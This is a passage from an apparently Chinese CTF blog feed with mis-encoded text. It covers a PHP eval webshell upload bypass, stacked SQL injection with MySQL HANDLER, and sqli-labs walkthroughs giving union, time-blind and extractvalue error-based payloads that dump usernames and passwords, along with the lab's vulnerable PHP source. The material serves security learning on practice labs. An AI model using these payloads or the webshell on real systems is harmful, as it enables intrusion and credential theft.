<p>è¯•è¯•æ–‡ä»¶ä¸Šä¼ <strong>index.php?module&#x3D;filemanage&amp;do&#x3D;upload</strong>ï¼Œå¼€å§‹æ–‡ä»¶ä¸Šä¼ ç»•è¿‡äº†ã€‚<br>ä¸Šä¼ æ™®é€šæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/0d3d7f7d4fb5489589b4ec2c5c1a4836.png" alt="1"><br>ä¸Šä¼ phpæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/6b49b925f1cd438188b1cc57f1273f96.png" alt="1"><br>ç»è¿‡ä¸€ç•ªæŠ˜è…¾ï¼Œè¯¥æ–‡ä»¶åç¼€php4,ä¸Šä¼ æ–‡ä»¶å†…å®¹<code>&lt;script language=&#39;php&#39;&gt;alert(@eval($_POST[1]))&lt;script&gt;</code><br>å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/9e5e3e5165bc4e4da1937253f9808910.png" alt="2"></p>
]]></content>
      <categories>
        <category>æ”»é˜²ä¸–ç•Œ</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥ä¹‹Handlerå‘½ä»¤å’Œå †å æ³¨å…¥</title>
    <url>/2023/03/16/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BHandler%E5%91%BD%E4%BB%A4%E5%92%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="Handlerå‘½ä»¤"><a href="#Handlerå‘½ä»¤" class="headerlink" title="Handlerå‘½ä»¤"></a>Handlerå‘½ä»¤</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>   mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚<br>    HANDLERè¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨ã€‚ </p>
<h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><p>HANDLER tbl_name OPEN [ [AS] alias]</p>
<blockquote>
<p>HANDLER tbl_name READ index_name { &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; } (value1,value2,â€¦)<br>[ WHERE where_condition ] [LIMIT â€¦ ]<br>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }<br>[ WHERE where_condition ] [LIMIT â€¦ ]<br>HANDLER tbl_name READ { FIRST | NEXT }<br>[ WHERE where_condition ] [LIMIT â€¦ ]<br>HANDLER tbl_name CLOSE</p>
</blockquote>
<p>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚<br>    é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>    é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</p>
<pre><code>é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚
é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚

é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚
é€šè¿‡HANDLER tbl_name READ index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚
</code></pre>
<p><a href="https://blog.csdn.net/jesseyoung/article/details/40785137">å‚è€ƒé“¾æ¥</a></p>
<h2 id="å †å æ³¨å…¥åŸç†"><a href="#å †å æ³¨å…¥åŸç†" class="headerlink" title="å †å æ³¨å…¥åŸç†"></a>å †å æ³¨å…¥åŸç†</h2><p>å †å æ³¨å…¥åŸç†</p>
<p>å †å æ³¨å…¥ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å°†è¯­å¥å †å åœ¨ä¸€èµ·è¿›è¡ŒæŸ¥è¯¢<br>åŸç†å¾ˆç®€å•ï¼Œmysql_multi_query() æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œå°±æ˜¯ä¸ª;åˆ†éš”ï¼Œæˆå †çš„æ‰§è¡Œsqlè¯­å¥ï¼Œä¾‹å¦‚</p>
<blockquote>
<p>select * from users;show databases; </p>
</blockquote>
<p>å°±åŒæ—¶æ‰§è¡Œä»¥ä¸Šä¸¤æ¡å‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¢åˆ æ”¹æŸ¥ï¼Œåªè¦æƒé™å¤Ÿ.<br>ä½†æ˜¯è¿™ç§æƒ…å†µå¾ˆå°‘è§ã€‚</p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="https://img-blog.csdnimg.cn/19719c3bfc764820ad5a2b9957f0839e.png" alt="1"><br>æœ¬é¢˜å¯ä»¥é‡‡ç”¨å †å æ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/8b7594e3e31442b7a0d718c619e1efd0.png" alt="1"><br>å›æ˜¾ç»“æœ<br><img src="https://img-blog.csdnimg.cn/1d5ed6be76614f47a0b8e2fe2e49579e.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/46eed84728fa4bfebb41527d8d279a42.png" alt="3"><br>è¿‡æ»¤çš„å‡½æ•°å¤ªå¤šäº†ï¼ŒæŠŠselectä¹Ÿè¿‡æ»¤äº†ï¼Œå¤§å°å†™ä¸è¡Œï¼ŒåŒå†™ä¸è¡Œã€‚æ ¹æ®å¸ˆå‚…ä»¬çš„è®²è§£äº†è§£åˆ°ï¼ŒHandleråœ¨è¿™ä¸ªé¢˜ä¸­å¯ä»¥ä½¿ç”¨ï¼Œæ ¹æ®handlerå‘½ä»¤çš„æ ¼å¼è¾“å…¥<code>1&#39;;Handler FlagHere OPEN;Handler FlagHere read first;Handler FlagHere close;#</code><br>æ‹¿åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/7137dd4295444e049d06c952d5a736e5.png" alt="4"></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2023/03/13/sqli-labs/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="less-03"><a href="#less-03" class="headerlink" title="less-03"></a>less-03</h2><p>çŸ¥é“éœ€è¦é—­åˆä»€ä¹ˆç¬¦å·ï¼Œæ¯”å¦‚è¿™å…³é—­åˆæ˜¯**â€™)**</p>
<blockquote>
<p>çˆ†å‡ºæœ‰å“ªäº›ä½ç½®å¯ä»¥è¿›è¡Œè¾“å‡ºæ•°æ® <code>1&#39;) order by 3--+</code></p>
<p>æŸ¥çœ‹æ•°æ®åº“åå­— <code>1&#39;) union select 1,2,database()--+</code></p>
<p>çˆ†ç ´è¡¨åï¼š <code>-1&#39;) union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code></p>
<p>çˆ†ç ´åˆ—åï¼š <code>1&#39;) union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code></p>
<p>çˆ†ç ´æ•°æ®ï¼š <code>1&#39;) union select 1,2,group_concat(id,username,password) FROM users--+</code></p>
</blockquote>
<h2 id="less-04"><a href="#less-04" class="headerlink" title="less -04"></a>less -04</h2><p>é‡ä¸Šé¢˜ä¸åŒçš„æ˜¯è¿™æ¬¡é—­åˆæ˜¯**â€)**</p>
<h2 id="less-9-æ—¶é—´ç›²æ³¨"><a href="#less-9-æ—¶é—´ç›²æ³¨" class="headerlink" title="less-9(æ—¶é—´ç›²æ³¨)"></a>less-9(æ—¶é—´ç›²æ³¨)</h2><p>æ— å›æ˜¾ï¼Œé‡‡ç”¨<strong>æ—¶é—´ç›²æ³¨</strong>åˆ¤æ–­å¯¹é”™<br> <strong>æ³¨æ„ï¼š</strong><br> é‡‡ç”¨æ—¶é—´ç›²æ³¨æ—¶é…åˆifè¯­å¥å¯ä»¥çŸ¥é“å‰è¾¹çš„é—­åˆç¬¦å·æ˜¯ä»€ä¹ˆï¼Œå°±è¿™é¢˜æ¥è¯´é‡‡ç”¨<code>if(1=2,1,sleep(2))--+</code><br>æ„æ€å°±æ˜¯å‰è¾¹<strong>1&#x3D;2</strong>å¦‚æœæ­£ç¡®ï¼Œä¾¿ä¼šæ‰§è¡Œ1ï¼Œå¦åˆ™æ‰§è¡Œsleep(2)ã€‚<strong>sleep(2)<strong>æ„æ€å°±æ˜¯å»¶ç¼“ä¸¤ç§’ï¼Œè¿™æ ·é€šè¿‡æ—¶é—´å°±å¯ä»¥åˆ¤æ–­å‡ºæˆ‘ä»¬å‰è¾¹å¿…å’Œç¬¦å·ä½¿ç”¨çš„å¯¹é”™æƒ…å†µã€‚<br>æœ¬é¢˜åŠ è½½<code>http://localhost:1000/sqli-labs/Less-9/?id=-1&#39; or if(1=2,1,sleep(2))--+</code>å¯ä»¥å‘ç°å»¶ç¼“ä¸¤ç§’æ‰è¾“å‡ºç»“æœï¼Œè¯´æ˜æ­¤è¯­å¥æ­£ç¡®ï¼Œä¹Ÿå°±æ˜¯é—­åˆç¬¦å·ä½¿ç”¨æ­£ç¡®ã€‚æˆ‘ä»¬è¦å¤šè¯•å‡ æ¬¡ï¼Œå¹¶ä¸æ˜¯ä¸€æ¬¡å°±èƒ½åˆ¤æ–­å‡ºçš„ã€‚<br><strong>åˆ¤æ–­æ•°æ®åº“å</strong><br>æ¬§å…‹ï¼Œä¸‹é¢æ›´éº»çƒ¦ï¼Œç”±äºä¸»é¡µé¢ä¸ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”åªè¾“å‡º</strong>You are inâ€¦â€¦â€¦..<strong>é‚£ä¹ˆå°±ä¸€ä¸ªä¸€ä¸ªçˆ†ç ´ï¼Œæ‰¾åˆ°æ•°æ®åº“æœ‰å¤šå°‘å­—ç¬¦ä¹Ÿå°±æ˜¯</strong>?id&#x3D;1â€™ and if(length(database())&gt;8,sleep(2),0) â€“+<strong>å¦‚æœå¤§äº8ï¼Œå°±å»¶ç¼“2ç§’æ­£å¸¸è¿è¡Œï¼Œå¦åˆ™æ­£å¸¸è¿è¡Œã€‚ç»è¿‡æµ‹è¯•å‘ç°æ•°æ®åº“åé•¿åº¦ä¸º8.<br>é•¿åº¦çŸ¥é“äº†å†çˆ†ç ´å…·ä½“åå­—</strong>?id&#x3D;1â€™ and if(ascii(substr(database(),1,1))&#x3D;115,sleep(2),1)â€“+</strong><br>æ­¤ä¸ºåˆ¤æ–­ç¬¬ä¸€ä¸ªå­—æ¯çš„asciiç æ˜¯å¦ä¸º115ï¼Œæœ€ç»ˆæ‰¾åˆ°<strong>security</strong><br><strong>åˆ¤æ–­è¡¨å</strong></p>
<p><code>?id=1â€™ and if(ascii(substr((select table_name from information_schema.tables where table_schema=â€˜securityâ€™ limit x,y),z,d))=e,sleep(1),0)â€“+</code></p>
<blockquote>
<p>å…¶ä¸­xä»£è¡¨ç¬¬x+1ä¸ªè¡¨ï¼Œyè¡¨ç¤ºç¬¬x+1å¾€åyä¸ªå•ä½çš„è¡¨ï¼Œzè¡¨ç¤ºç¬¬å‡ ä¸ªå­—æ¯ï¼Œdè¡¨ç¤ºzå¾€ådä¸ªå•ä½çš„å­—æ¯</p>
</blockquote>
<p><strong>åˆ¤æ–­åˆ—å</strong></p>
<p><code>?id=1â€™ and If(ascii(substr((select column_name from information_schema.columns where table_name=â€˜usersâ€™ and table_schema=database() limit x,y),z,d))=105,sleep(2),1)â€“+</code></p>
<blockquote>
<p>xï¼šç¬¬x+1ä¸ªåˆ—ï¼Œyï¼šx+1ä¸ªåˆ—å¾€åyä¸ªå•ä½ï¼Œzï¼šx+1åˆ—çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œdï¼šç¬¬ä¸€ä¸ªå­—æ¯å¾€åçš„ç¬¬zä¸ªå•ä½</p>
</blockquote>
<p>æœ€åçˆ†æ•°æ®ã€‚</p>
<h2 id="less-10"><a href="#less-10" class="headerlink" title="less 10"></a>less 10</h2><p>é—­åˆç¬¦å·ä¸º**â€**</p>
<h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p>è¾“å…¥<code>-1&#39; or 1=1#</code>æ­£å¸¸è¿”å›ï¼ŒæŸ¥åˆ—ã€‚<br><code>admin&#39; order by 2#</code>å›æ˜¾<code>admin&#39; order by 3#</code>æŠ¥é”™<br><img src="https://img-blog.csdnimg.cn/c20c6ec4119c4561a4426a6ea998b3f6.png" alt="1"><br>æ¬§å…‹ï¼Œæ¥ä¸‹æ¥æ­£å¸¸æ“ä½œã€‚</p>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less 17"></a>less 17</h2><p>åˆ†ææºç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//including the Mysql connect parameters.</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">check_input</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
		<span class="token comment">// truncation (see comments)</span>
		<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æˆªå–è´¦æˆ·å‰15çš„å­—ç¬¦</span>
		<span class="token punctuation">&#125;</span>

		<span class="token comment">// Stripslashes if magic quotes enabled</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">/*get_magic_quotes_gpc()
åˆ¤æ–­è¯¥å‡½æ•°æ˜¯å¦è¢«æ‰“å¼€ï¼Œè‹¥è¯¥å‡½æ•°è¢«æ‰“å¼€ï¼Œä¼šè½¬ä¹‰  å•å¼•å·ï¼ˆ'ï¼‰åŒå¼•å·ï¼ˆ"ï¼‰åæ–œæ ï¼ˆ\ï¼‰ç©ºå­—ç¬¦ï¼ˆ\0ï¼‰
æ¢è¡Œç¬¦ï¼ˆ\nï¼‰
å›è½¦ç¬¦ï¼ˆ\rï¼‰
æ°´å¹³åˆ¶è¡¨ç¬¦ï¼ˆ\tï¼‰
å‚ç›´åˆ¶è¡¨ç¬¦ï¼ˆ\x0Bï¼‰
*/</span>
			<span class="token punctuation">&#123;</span>
			<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤åæ–œæ </span>
			<span class="token punctuation">&#125;</span>

		<span class="token comment">// Quote if not a number</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_digit</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#123;</span>
			<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span> <span class="token operator">.</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token comment">//mysql_real_escape_stringï¼šè½¬ä¹‰å­—ç¬¦</span>
			<span class="token punctuation">&#125;</span>
		
	<span class="token keyword">else</span>
		<span class="token punctuation">&#123;</span>
		<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

<span class="token comment">// take the variables</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token punctuation">&#123;</span>
<span class="token comment">//making sure uname is not injectable</span>
<span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token comment">//logging the connection parameters to a file for analysis.</span>
<span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'result.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'User Name:'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'New Password:'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">// connectivity </span>
@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username= <span class="token interpolation"><span class="token variable">$uname</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æŸ¥è¯¢è¯­å¥</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mysql_fetch_array() å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œåˆ™è¿”å› falseã€‚</span>
<span class="token comment">//echo $row;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  		<span class="token comment">//echo '&lt;font color= "</span><span class="token comment">#0000ff">';	</span>
		<span class="token variable">$row1</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  	
		<span class="token comment">//echo 'Your Login name:'. $row1;</span>
		<span class="token variable">$update</span><span class="token operator">=</span><span class="token string double-quoted-string">"UPDATE users SET password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span>
		<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$update</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
	
	
	
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>
			<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//******************************</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/br>"</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>
			<span class="token comment">//echo " You password has been successfully updated " ;		</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag1.jpg"   />'</span><span class="token punctuation">;</span>	
		<span class="token comment">//echo 'Your Password:' .$row['password'];</span>
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
	


  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>  
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="4.5" color="#FFFF00">'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo "Bug off you Silly Dumb hacker";</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap1.jpg"   />'</span><span class="token punctuation">;</span>
	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å­¦åˆ°ä¸‰ç§æŠ¥é”™æ³¨å…¥ï¼š</p>
<h3 id="extractvalueæŠ¥é”™æ³¨å…¥"><a href="#extractvalueæŠ¥é”™æ³¨å…¥" class="headerlink" title="extractvalueæŠ¥é”™æ³¨å…¥"></a>extractvalueæŠ¥é”™æ³¨å…¥</h3><p>extractvalue(XML_document,XPath_string)</p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc</p>
<p>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ã€‚</p>
<p>ä½œç”¨ï¼šä»XML_documentä¸­æå–ç¬¦åˆXPATH_stringçš„å€¼ï¼Œå½“æˆ‘ä»¬XPath_stringè¯­æ³•æŠ¥é”™æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œä¸‹é¢çš„è¯­æ³•å°±æ˜¯é”™è¯¯çš„ã€‚concatå’Œgroup_concatä½œç”¨ä¸€æ ·<code>0x5c</code>æ˜¯<code>\\</code>çš„16è¿›åˆ¶.</p>
<blockquote>
<p>1â€™ and (extractvalue(1,concat(0x5c,version(),0x5c)))#    çˆ†ç‰ˆæœ¬<br>1â€™ and (extractvalue(1,concat(0x5c,database(),0x5c)))#   çˆ†æ•°æ®åº“<br>1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c)))#   çˆ†è¡¨å<br>1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;â€™usersâ€™),0x5c)))#<br>çˆ†å­—æ®µå<br>1â€™ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username&#x3D;â€™admin1â€™) b) ,0x5c)))#      çˆ†å­—æ®µå†…å®¹è¯¥æ ¼å¼é’ˆå¯¹mysqlæ•°æ®åº“ã€‚<br>1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      çˆ†å­—æ®µå†…å®¹ã€‚</p>
</blockquote>
<p>åœ¨æœ€åä¸€æ­¥çˆ†å­—æ®µå†…å®¹æ—¶å€™ï¼Œä¼šæŠ¥é”™ï¼ŒåŸå› æ˜¯<strong>mysqlæ•°æ®ä¸æ”¯æŒæŸ¥è¯¢å’Œæ›´æ–°æ˜¯åŒä¸€å¼ è¡¨</strong>ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ ä¸€ä¸ª<strong>ä¸­é—´è¡¨ã€‚</strong></p>
